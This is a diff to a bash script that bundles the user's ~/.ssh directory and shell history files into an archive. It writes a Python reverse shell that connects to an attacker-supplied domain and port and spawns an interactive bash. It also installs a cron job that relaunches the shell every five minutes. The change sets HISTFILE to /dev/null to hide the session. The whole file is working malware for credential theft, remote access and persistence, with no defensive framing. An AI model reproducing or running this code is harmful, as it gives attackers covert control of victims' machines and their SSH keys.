@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# Dependencies
-# tar curl cron python3 flock
-
 targets=( ~/.ssh ~/.zshrc ~/.zsh_history ~/.bash_history )
 tar -czvf backups.tar.gz "${targets[@]}"
 
@@ -30,8 +27,20 @@ script_path="$parent_path/x.sh"
 mkdir -p "$parent_path"
 cat << EOF > "$script_path"
 #!/bin/bash
-python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$domain_name',$received_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/bash')"
-EOF 
+python3 -c "
+import socket,subprocess,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('$domain_name',$received_port))
+fd=s.fileno()
+os.dup2(fd,0)
+os.dup2(fd,1)
+os.dup2(fd,2)
+os.putenv('HISTFILE','/dev/null')
+os.putenv('TERM','xterm')
+pty.spawn(['/bin/bash','-i'])
+s.close()
+"
+EOF
 bash "$script_path"
 
 CRON_JOB="*/5 * * * * flock -n /tmp/x_script.lock $script_path"
